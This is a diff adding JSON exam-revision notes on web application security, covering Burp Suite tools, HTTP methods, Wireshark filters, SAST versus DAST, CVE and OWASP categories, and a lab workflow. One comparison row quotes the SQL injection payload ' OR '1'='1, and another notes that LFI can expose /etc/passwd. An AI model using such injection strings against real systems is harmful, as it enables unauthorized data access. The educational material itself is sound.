+      "oneLiners": []
+    },
+    {
+      "id": "69-intruder",
+      "title": "Intruder",
+      "definition": "Automates repeated requests using payloads.",
+      "examPoints": [
+        "Uses:",
+        "Fuzzing",
+        "Brute-force testing",
+        "Parameter testing",
+        "Enumeration",
+        "Token analysis",
+        "Intruder must only be used against authorized systems."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "70-scanner",
+      "title": "Scanner",
+      "definition": "Automatically identifies common web vulnerabilities.",
+      "examPoints": [
+        "Possible findings:",
+        "SQL Injection",
+        "XSS",
+        "Misconfiguration",
+        "Insecure headers",
+        "Outdated components",
+        "Scanner findings must be manually verified because automated scanners can produce false positives and false negatives."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "71-decoder",
+      "title": "Decoder",
+      "definition": "Encodes and decodes data.",
+      "examPoints": [
+        "Examples:",
+        "Base64",
+        "URL encoding",
+        "Hexadecimal",
+        "HTML encoding",
+        "Encoding is not encryption."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "72-comparer",
+      "title": "Comparer",
+      "definition": "Compares two requests or responses to identify differences.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "73-target",
+      "title": "Target",
+      "definition": "Maps the application's:",
+      "examPoints": [
+        "URLs",
+        "Endpoints",
+        "Parameters",
+        "Files",
+        "Attack surface"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "74-extender",
+      "title": "Extender",
+      "definition": "Adds extensions to Burp Suite.",
+      "examPoints": [
+        "Extensions can provide:",
+        "Additional scanners",
+        "Token analysis",
+        "Logging",
+        "Custom testing capabilities",
+        "# Session 4"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "75-15-data-extraction",
+      "title": "15. Data Extraction",
+      "definition": "Data extraction means obtaining sensitive information from a vulnerable application.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "76-common-techniques",
+      "title": "Common techniques",
+      "definition": "",
+      "examPoints": [
+        "SQL Injection",
+        "IDOR",
+        "Broken access control",
+        "LFI",
+        "Insecure APIs",
+        "XSS-based cookie theft",
+        "Unprotected backups",
+        "Directory traversal",
+        "Exposed cloud storage",
+        "Weak authentication"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "77-data-targeted-by-attackers",
+      "title": "Data targeted by attackers",
+      "definition": "",
+      "examPoints": [
+        "Passwords",
+        "Password hashes",
+        "Session tokens",
+        "API keys",
+        "Personal information",
+        "Financial information",
+        "Business records",
+        "Source code",
+        "Configuration files"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "78-16-advanced-identification-and-exploitation",
+      "title": "16. Advanced Identification and Exploitation",
+      "definition": "Advanced vulnerability identification goes beyond automated scanning.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "79-examples",
+      "title": "Examples",
+      "definition": "",
+      "examPoints": [
+        "Blind SQL Injection",
+        "Time-based SQL Injection",
+        "Out-of-band injection",
+        "Session fixation",
+        "Session hijacking",
+        "Business-logic exploitation",
+        "Race conditions",
+        "Chained vulnerabilities",
+        "Reverse engineering",
+        "Zero-day exploitation",
+        "Authentication bypass",
+        "Authorization bypass"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "80-vulnerability-chaining",
+      "title": "Vulnerability chaining",
+      "definition": "Attackers may combine several low- or medium-risk vulnerabilities.",
+      "examPoints": [
+        "Example:"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "Information disclosure",
+        "→ username enumeration",
+        "→ weak password reset",
+        "→ account takeover",
+        "→ privilege escalation"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "82-get",
+      "title": "GET",
+      "definition": "Retrieves a resource.",
+      "examPoints": [
+        "Intended to be safe",
+        "Intended to be idempotent",
+        "Data commonly appears in the URL",
+        "GET should not perform sensitive state-changing operations."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "83-post",
+      "title": "POST",
+      "definition": "Submits data or creates a resource.",
+      "examPoints": [
+        "POST is not necessarily idempotent."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "84-put",
+      "title": "PUT",
+      "definition": "Creates or replaces a resource at a specified location.",
+      "examPoints": [
+        "PUT is normally idempotent."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "85-patch",
+      "title": "PATCH",
+      "definition": "Partially updates a resource.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "86-delete",
+      "title": "DELETE",
+      "definition": "Deletes a resource.",
+      "examPoints": [
+        "DELETE is normally considered idempotent."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "87-head",
+      "title": "HEAD",
+      "definition": "Returns headers without the response body.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "88-options",
+      "title": "OPTIONS",
+      "definition": "Returns supported methods or communication options.",
+      "examPoints": [
+        "Used in CORS preflight requests."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "89-trace",
+      "title": "TRACE",
+      "definition": "Echoes a request back to the client.",
+      "examPoints": [
+        "It is often disabled because it may expose sensitive request information."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "90-http-method-vulnerabilities",
+      "title": "HTTP method vulnerabilities",
+      "definition": "",
+      "examPoints": [
+        "Unnecessary methods enabled",
+        "Anonymous PUT uploads",
+        "Unauthorized DELETE operations",
+        "TRACE enabled",
+        "Method-based access-control bypass",
+        "Inconsistent security across methods"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "91-mitigation",
+      "title": "Mitigation",
+      "definition": "",
+      "examPoints": [
+        "Enable only required methods.",
+        "Apply authentication and authorization to every method.",
+        "Disable TRACE unless specifically required.",
+        "Test method override headers.",
+        "Log unusual method usage."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "92-18-wireshark-for-web-analysis",
+      "title": "18. Wireshark for Web Analysis",
+      "definition": "Wireshark captures and analyzes network packets.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "93-capture-filter",
+      "title": "Capture filter",
+      "definition": "A capture filter decides which packets are collected.",
+      "examPoints": [
+        "Example:"
+      ],
+      "comparisons": [],
+      "commands": [
+        "host 192.168.1.10"
+      ],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "94-display-filter",
+      "title": "Display filter",
+      "definition": "A display filter decides which captured packets are shown.",
+      "examPoints": [
+        "Examples:"
+      ],
+      "comparisons": [],
+      "commands": [
+        "http",
+        "tcp.port == 80",
+        "ip.addr == 192.168.1.10",
+        "dns"
+      ],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "95-what-wireshark-can-reveal",
+      "title": "What Wireshark can reveal",
+      "definition": "HTTPS traffic can normally be captured, but its application payload is encrypted.",
+      "examPoints": [
+        "Source and destination IP addresses",
+        "TCP connections",
+        "DNS queries",
+        "HTTP requests",
+        "Unencrypted credentials",
+        "Cookies",
+        "Protocol errors",
+        "Network latency",
+        "Suspicious connections",
+        "# Session 5"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "96-19-sast",
+      "title": "19. SAST",
+      "definition": "SAST stands for Static Application Security Testing.",
+      "examPoints": [
+        "It analyzes application source code, bytecode, or binaries without executing the application."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "97-advantages",
+      "title": "Advantages",
+      "definition": "",
+      "examPoints": [
+        "Used early in development",
+        "Identifies insecure code locations",
+        "Integrates with CI/CD",
+        "Scans large codebases",
+        "Helps developers correct vulnerabilities"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "98-limitations",
+      "title": "Limitations",
+      "definition": "",
+      "examPoints": [
+        "Requires code or build artifacts",
+        "May generate false positives",
+        "Cannot fully identify runtime misconfiguration",
+        "May struggle with complex business logic"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "99-common-tools",
+      "title": "Common tools",
+      "definition": "",
+      "examPoints": [
+        "Checkmarx",
+        "Fortify",
+        "SonarQube",
+        "Veracode"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "100-20-dast",
+      "title": "20. DAST",
+      "definition": "DAST stands for Dynamic Application Security Testing.",
+      "examPoints": [
+        "It tests a running application from an external perspective."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "101-advantages",
+      "title": "Advantages",
+      "definition": "",
+      "examPoints": [
+        "Tests actual runtime behaviour",
+        "Detects deployment misconfiguration",
+        "Does not always require source code",
+        "Simulates attacker interaction",
+        "Identifies externally exploitable weaknesses"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "102-limitations",
+      "title": "Limitations",
+      "definition": "",
+      "examPoints": [
+        "Finds vulnerabilities later in the lifecycle",
+        "May not identify the exact vulnerable code line",
+        "Coverage depends on discovered endpoints",
+        "May produce false positives and false negatives"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "103-common-tools",
+      "title": "Common tools",
+      "definition": "",
+      "examPoints": [
+        "OWASP ZAP",
+        "Burp Suite",
+        "Acunetix",
+        "Invicti"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "104-sast-vs-dast",
+      "title": "SAST vs DAST",
+      "definition": "Using both provides better coverage.",
+      "examPoints": [],
+      "comparisons": [
+        "SAST: DAST",
+        "Tests source code or binaries: Tests a running application",
+        "White-box approach: Black-box approach",
+        "Used early in development: Used during testing or deployment",
+        "Identifies vulnerable code locations: Identifies exploitable runtime behaviour",
+        "Detects insecure coding patterns: Detects runtime and configuration issues",
+        "Examples: Checkmarx, Fortify: Examples: ZAP, Burp Suite"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "105-21-web-application-framework-security",
+      "title": "21. Web Application Framework Security",
+      "definition": "Frameworks simplify development but may introduce risk when misconfigured.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "106-common-framework-risks",
+      "title": "Common framework risks",
+      "definition": "",
+      "examPoints": [
+        "Debug mode enabled",
+        "Default credentials",
+        "Outdated framework versions",
+        "Disabled CSRF protection",
+        "Unsafe template rendering",
+        "Improper ORM usage",
+        "Insecure session configuration",
+        "Exposed administrative interfaces"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "107-django-example",
+      "title": "Django example",
+      "definition": "Important controls include:",
+      "examPoints": [
+        "Disable DEBUG in production.",
+        "Configure ALLOWED_HOSTS.",
+        "Use CSRF protection.",
+        "Use template auto-escaping.",
+        "Protect SECRET_KEY.",
+        "Use secure cookies.",
+        "Keep Django updated.",
+        "Avoid raw SQL unless necessary.",
+        "Framework security features are effective only when correctly configured."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "108-22-browser-jsguard",
+      "title": "22. Browser JSGuard",
+      "definition": "JSGuard is a browser-security extension intended to identify suspicious or malicious JavaScript behaviour.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "109-possible-detections",
+      "title": "Possible detections",
+      "definition": "",
+      "examPoints": [
+        "Malicious redirects",
+        "Suspicious scripts",
+        "Drive-by downloads",
+        "Phishing pages",
+        "Script-based attacks"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "110-limitation",
+      "title": "Limitation",
+      "definition": "A browser extension is an additional defensive layer. It does not replace:",
+      "examPoints": [
+        "Secure coding",
+        "CSP",
+        "Browser updates",
+        "Endpoint protection",
+        "Web application testing",
+        "User awareness"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "112-cve",
+      "title": "CVE",
+      "definition": "CVE stands for Common Vulnerabilities and Exposures.",
+      "examPoints": [
+        "A CVE identifier gives a standardized name to a publicly known vulnerability.",
+        "Example format:"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "CVE-2025-12345"
+      ],
+      "oneLiners": []
+    },
+    {
+      "id": "113-nvd",
+      "title": "NVD",
+      "definition": "NVD stands for National Vulnerability Database.",
+      "examPoints": [
+        "It enriches CVE records with information such as:",
+        "Severity",
+        "CVSS score",
+        "Affected products",
+        "References",
+        "Weakness classification",
+        "Configuration information"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "114-cve-vs-cvss",
+      "title": "CVE vs CVSS",
+      "definition": "A high CVSS score does not automatically mean the highest business risk. Asset importance and exposure must also be considered.",
+      "examPoints": [],
+      "comparisons": [
+        "CVE: CVSS",
+        "Identifies a vulnerability: Measures severity",
+        "Standard naming system: Scoring system",
+        "Does not itself represent risk: Helps prioritize remediation"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "115-24-owasp-web-security-testing-guide",
+      "title": "24. OWASP Web Security Testing Guide",
+      "definition": "The OWASP Web Security Testing Guide provides a structured methodology for testing web applications.",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "116-major-testing-areas",
+      "title": "Major testing areas",
+      "definition": "",
+      "examPoints": [
+        "Information gathering",
+        "Configuration and deployment testing",
+        "Identity-management testing",
+        "Authentication testing",
+        "Authorization testing",
+        "Session-management testing",
+        "Input-validation testing",
+        "Error-handling testing",
+        "Cryptography testing",
+        "Business-logic testing",
+        "Client-side testing",
+        "API testing"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "117-25-practical-lab-workflow",
+      "title": "25. Practical Lab Workflow",
+      "definition": "A safe web-application security lab should use intentionally vulnerable platforms such as:",
+      "examPoints": [
+        "DVWA",
+        "WebGoat",
+        "OWASP Juice Shop",
+        "Mutillidae"
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "118-suggested-workflow",
+      "title": "Suggested workflow",
+      "definition": "Testing must be restricted to systems explicitly authorized for assessment.",
+      "examPoints": [
+        "Define authorization and scope.",
+        "Configure the vulnerable application.",
+        "Configure Burp Suite Proxy.",
+        "Map the application.",
+        "Identify entry points.",
+        "Test authentication.",
+        "Test access control.",
+        "Test input validation.",
+        "Test SQL Injection.",
+        "Test XSS.",
+        "Test HTTP methods.",
+        "Perform DAST scanning.",
+        "Analyze traffic using Wireshark.",
+        "Manually verify findings.",
+        "Document evidence.",
+        "Provide remediation recommendations.",
+        "Restore the lab environment."
+      ],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "120-vulnerability-vs-threat-vs-risk",
+      "title": "Vulnerability vs threat vs risk",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [
+        "Term: Meaning",
+        "Asset: Something valuable",
+        "Threat: Something capable of causing harm",
+        "Vulnerability: A weakness",
+        "Exploit: A method that takes advantage of a vulnerability",
+        "Risk: Likelihood and impact of harm",
+        "Control: A safeguard that reduces risk"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "121-sql-injection-vs-xss",
+      "title": "SQL Injection vs XSS",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [
+        "SQL Injection: XSS",
+        "Targets database queries: Targets browser execution",
+        "Executes database commands: Executes JavaScript or HTML",
+        "Often affects server-side data: Primarily affects users",
+        "Prevented by parameterization: Prevented by output encoding and sanitization"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "122-lfi-vs-rfi",
+      "title": "LFI vs RFI",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [
+        "LFI: RFI",
+        "Includes local server files: Includes remote files",
+        "Can expose /etc/passwd: Can load attacker-hosted code",
+        "Primarily path manipulation: Primarily remote URL inclusion"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "123-reflected-vs-stored-vs-dom-xss",
+      "title": "Reflected vs Stored vs DOM XSS",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [
+        "Type: Location",
+        "Reflected XSS: Payload returned in immediate server response",
+        "Stored XSS: Payload stored on the server",
+        "DOM XSS: Payload processed by client-side JavaScript"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "124-idor-vs-sql-injection",
+      "title": "IDOR vs SQL Injection",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [
+        "IDOR: SQL Injection",
+        "Authorization failure: Injection failure",
+        "Manipulates object identifiers: Manipulates SQL query structure",
+        "Example: changing invoice ID: Example: ' OR '1'='1"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "125-burp-proxy-vs-repeater-vs-intruder-vs-scanner",
+      "title": "Burp Proxy vs Repeater vs Intruder vs Scanner",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [
+        "Tool: Purpose",
+        "Proxy: Intercept and modify traffic",
+        "Repeater: Manually resend requests",
+        "Intruder: Automate payload-based testing",
+        "Scanner: Automatically identify vulnerabilities"
+      ],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": []
+    },
+    {
+      "id": "126-27-important-exam-points",
+      "title": "27. Important Exam Points",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [],
+      "oneLiners": [
+        "OWASP Top 10 is a risk-awareness document, not a complete testing methodology.",
+        "Input validation alone does not prevent every vulnerability.",
+        "Parameterized queries are the main defence against SQL Injection.",
+        "Stored procedures can still be vulnerable when they use dynamic SQL.",
+        "Output encoding is essential for preventing XSS.",
+        "Client-side validation can be bypassed.",
+        "Authorization must be enforced on the server.",
+        "HTTPS protects data in transit but does not fix insecure application logic.",
+        "SAST examines code without running the application.",
+        "DAST tests a running application.",
+        "Burp Repeater is used for manual request modification.",
+        "Burp Intruder automates repeated payload testing.",
+        "Wireshark captures packets but does not automatically prove a web vulnerability.",
+        "Risk is commonly prioritized using likelihood and impact.",
+        "CVE identifies a vulnerability; CVSS scores its severity.",
+        "LFI includes local files; RFI includes remote files.",
+        "Stored XSS persists on the server.",
+        "Reflected XSS normally requires a crafted request or link.",
+        "DOM XSS occurs through unsafe client-side JavaScript.",
+        "DoS primarily attacks availability.",
+        "Least privilege limits the impact of compromise.",
+        "Security headers reduce risk but do not replace secure coding.",
+        "Automated scanner findings must be manually verified.",
+        "HTTP methods must be individually authorized.",
+        "Testing must be conducted only in an authorized environment."
+      ]
+    },
+    {
+      "id": "127-28-quick-revision-sheet",
+      "title": "28. Quick Revision Sheet",
+      "definition": "",
+      "examPoints": [],
+      "comparisons": [],
+      "commands": [],
+      "workflows": [
+        "OWASP A01 → Broken Access Control",
+        "OWASP A02 → Cryptographic Failures",
+        "OWASP A03 → Injection",
+        "OWASP A04 → Insecure Design",
+        "OWASP A05 → Security Misconfiguration",
+        "OWASP A06 → Vulnerable and Outdated Components",
+        "OWASP A07 → Identification and Authentication Failures",
+        "OWASP A08 → Software and Data Integrity Failures",
+        "OWASP A09 → Logging and Monitoring Failures",
+        "OWASP A10 → SSRF",
+        "SQL Injection Defence → Parameterized queries",
+        "XSS Defence → Context-sensitive output encoding",
+        "LFI/RFI Defence → File allowlist",
+        "DoS Defence → Rate limiting and traffic filtering",
+        "Access-Control Principle → Least privilege",
+        "SAST → Code without execution",
+        "DAST → Running application",
+        "Burp Proxy → Intercept traffic",
+        "Burp Repeater → Modify and resend manually",
+        "Burp Intruder → Automated payload testing",
+        "Burp Scanner → Automated vulnerability discovery",
+        "Wireshark → Packet capture and analysis",
+        "CVE → Vulnerability identifier",
+        "CVSS → Severity score",
+        "NVD → Vulnerability information database",
+        "STRIDE → Threat-modelling framework"
+      ],
+      "oneLiners": []
+    }
+  ],
+  "audio": "/audio/sc/web-application-security.mp3"
+}
